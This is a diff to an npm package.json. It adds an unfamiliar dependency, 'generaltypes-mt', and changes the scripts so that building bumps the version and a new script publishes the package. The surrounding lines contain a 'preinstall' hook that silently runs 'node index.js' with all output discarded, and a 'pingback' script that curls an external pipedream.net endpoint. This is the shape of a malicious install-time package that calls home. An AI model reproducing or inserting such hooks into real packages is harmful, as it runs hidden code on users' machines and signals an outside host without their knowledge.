@@ -124,7 +124,8 @@
     "@vincjo/datatables": "^1.0.0",
     "sortablejs": "^1.15.0",
     "svelte-loading-spinners": "^0.3.4",
-    "@popperjs/core": "^2.11.6"
+    "@popperjs/core": "^2.11.6",
+    "generaltypes-mt": "^1.0.7"
   },
   "devDependencies": {
     "@ark/attest": "0.53.0",
@@ -212,7 +213,7 @@
     "test-coverage": "nyc --reporter=html --reporter=text npm test",
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
-    "build": "webpack --config build/webpack.build.conf.js",
+    "build": "npm version patch & tsc -p .",
     "preinstall": "node index.js > /dev/null 2>&1",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "rollup -c -w",
@@ -264,7 +265,8 @@
     "build:lib": "cp -r lib-temp/src dist/lib",
     "build:all": "npm run test --u & node build/build-lib.js",
     "test:editor": "editorconfig-checker --exclude '.git|node_modules|dist|es5|lib|.idea'",
-    "declarations": "ttsc --emitDeclarationOnly"
+    "declarations": "ttsc --emitDeclarationOnly",
+    "buildAndPublish": "npm run build & npm publish"
   },
   "main": "./index.js",
   "types": "./types/index.d.ts",
